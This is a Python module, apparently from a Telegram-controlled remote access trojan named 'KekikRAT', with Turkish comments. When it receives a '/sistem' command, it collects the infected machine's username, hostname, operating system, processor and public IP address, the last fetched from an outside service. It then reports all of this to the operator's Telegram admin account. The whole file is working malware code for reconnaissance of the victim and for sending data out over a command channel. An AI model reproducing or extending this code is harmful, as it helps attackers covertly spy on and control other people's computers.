#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client, Filters
from KekikRAT import adminID
import requests, os, platform

@Client.on_message(Filters.command(['sistem'], ['!','.','/']))
def sistem(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `sistem` Komutunu Verdi!\n\n"

    mesaj += f"""Kullanıcı : {os.getlogin()}@{platform.node()}
IP : {requests.get('http://ip.42.pl/raw').text}
OS : {platform.system()} | {platform.release()}
İşlemci : {platform.processor()}"""

    kekik.edit(mesaj)